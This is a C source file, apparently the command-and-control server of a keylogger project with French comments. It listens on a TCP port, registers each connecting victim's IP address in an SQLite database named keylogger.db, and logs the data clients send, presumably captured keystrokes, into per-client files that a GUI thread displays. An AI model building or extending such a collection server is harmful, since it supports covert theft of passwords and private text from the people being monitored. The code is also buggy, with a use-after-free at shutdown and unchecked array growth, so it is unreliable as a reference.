#include <errno.h>
#include <fcntl.h>
#include "server.h"
#include <pthread.h>
#include "../database/interface/mainWindow.h"
#include "../database/database.h"

int			init_socket(nfds_t *reuse) {
  struct addrinfo	hints, *resinfo = NULL;
  int			sock = -1;

  memset(&hints, 0, sizeof(struct addrinfo));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = AI_PASSIVE | AI_ADDRCONFIG;
  hints.ai_protocol = 0;
  if (getaddrinfo(NULL, PORT, &hints, &resinfo) != 0)
    err(3, "Getaddrinfo error");
  if ((sock = socket(resinfo->ai_family, resinfo->ai_socktype, resinfo->ai_protocol)) < 0)
    err(3, "Socket error");
  if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, reuse, sizeof(*reuse)) == -1)
    err(3, "Setsockopt error");
  if (bind(sock, resinfo->ai_addr, resinfo->ai_addrlen) != 0)
    err(3, "Bind error");
  freeaddrinfo(resinfo);
  return (sock);
}

struct data {
  sqlite3 *keylogger;
  int num_client;
  char *link;

};

void server(struct sockaddr_in *addr, struct data *d) {
  socklen_t socklen= sizeof(struct sockaddr_in);
  int		sock_fd;
  int		io= 1;
  int		new_fd, n;
  nfds_t	reuse = 1;
  char		buffer[BUFFSIZE];
  struct pollfd fds[200];
  d->num_client= 0;
  //conserver l'adresse du client dans le while
  char addr_store[20];
  //stocker les donnees du client sous forme de fichier
  FILE *file;
  //fichier qui servira a stocker les donnees
  char link[60]= "../../files/client_files/dataSent_byClient";
  char tmp[60];

  //initialisation de tous les tableaux
  memset(&addr_store, 0, sizeof(addr_store));
  memset(&buffer, 0, sizeof(buffer));
  memset(fds, 0, sizeof(fds));

  sock_fd = init_socket(&reuse);
  fds[0].events= POLLIN;

  if(!listen(sock_fd, 100)) {
    if(poll(fds, reuse, 1000) < 0)
      perror("poll error");
  }
  else
    printf("%d\n", sock_fd);
  
  while(1) {
    fds[0].fd = sock_fd;
    fds[0].events = POLLIN;
    ioctl(fds[0].fd, FIONBIO, &io);

    if (poll(fds, reuse, 1000000) < 0)
      perror("Poll error");

    for(nfds_t i = 0; i < reuse; i++) {
      if(fds[i].revents & POLLNVAL)
	continue;
      
      if (fds[i].revents & POLLERR) {
	close(fds[i].fd);
	continue;
      }

      if(fds[i].revents == POLLHUP || fds[i].revents == POLLERR) {
	close(fds[i].fd);
	continue;
      }
      else if (fds[i].revents == 0)
        continue;

      if (fds[i].revents != POLLIN && fds[i].revents != POLLPRI) {
        perror("pollin error");
      }

      if (fds[i].fd == fds[0].fd) {
	d->num_client++;
	printf("num client %d\n", d->num_client);
      	do {
          new_fd = accept(fds[0].fd, (struct sockaddr*)&addr[i], &socklen);
	  //printf("client addr: %s\n", inet_ntoa(addr[i].sin_addr));
          if (new_fd == -1)
             break;

	  char name_client[20]= "client ";
	  strcat(name_client, itoa(d->num_client));
	  
	  //creation du client au moment de la connexion au serveur
	  printf("num_client %d\n", d->num_client);
	  create_clients(d->keylogger, inet_ntoa(addr[i].sin_addr), name_client);

	  fds[reuse].fd = new_fd;
          fds[reuse].events = POLLIN;
          reuse++;
	  
	  //on conserve l'adresse du client
	  strncpy(addr_store, inet_ntoa(addr[i].sin_addr), 20);
	  //reinitialisation du buffer
	  memset(buffer, 0, 256);
        } while (new_fd != -1);
      }
      else {
	while((n= read(fds[i].fd, buffer, 256)) > 0) {
	  //creation du fichier pour stocker les donnees du client
	  memset(tmp, 0, 60);
	  strcat(tmp, link);
	  strcat(tmp, itoa(d->num_client));
	  strcat(tmp, ".txt");

	  //creation de la donnee du client 
	  if(research_data(d->keylogger, d->num_client) == 0)
	    create_data(d->keylogger, 1, d->num_client, tmp);

	  file= fopen(tmp, "a");
	  if(file == NULL)
	    err(1, "Pb with fopen dataSent_byClient");

	  if(fprintf(file, "%s\n", buffer) < 0)
	    err(1, "Pb with fprintf");

	  if(fclose(file) != 0)
	    err(1, "Pb with close");
	  d->link= tmp;

	  fcntl(fds[i].fd, F_SETFL, O_NONBLOCK);
	  
	  save_data("\n\n");
	  save_data(buffer);

	  //printf("while before data sent: %s %d\n", addr_store, fds[i].fd);
	  //printf("Data sent: %s\n", buffer);
	  memset(buffer, 0, 256);
	}
	if(n < 0 && (errno != EAGAIN && errno != EWOULDBLOCK)) {
	  close(fds[i].fd);
	}
	else
	  continue;
      }
    }
  }
}

void sigint_handler(int sig) {
  warnx("Get signal %d, dying", sig);
  _exit(sig);
}

int main () { 
  struct data *d= calloc(1, sizeof(struct data));
  pthread_t thread_window;

  int res= sqlite3_open("../database/keylogger.db", &d->keylogger);
  
  if(pthread_create(&thread_window, NULL, mainWindow, (void *)d) == -1) {
    perror("pthread create error\n");
    return EXIT_FAILURE;
  }

  if(res) {
    perror("can't succeed\n");
    exit(0);
  }
  else
    printf("connection success\n");
  
  struct sockaddr_in *addr= calloc(100, sizeof(struct sockaddr_in));
  signal(SIGINT, sigint_handler);
  server(addr, d);
  free(addr);
  free(d);
  sqlite3_close(d->keylogger);

  if(pthread_join(thread_window, NULL)) {
    perror("pthread_join error\n");
    return EXIT_FAILURE;
  }
  return 0;
}
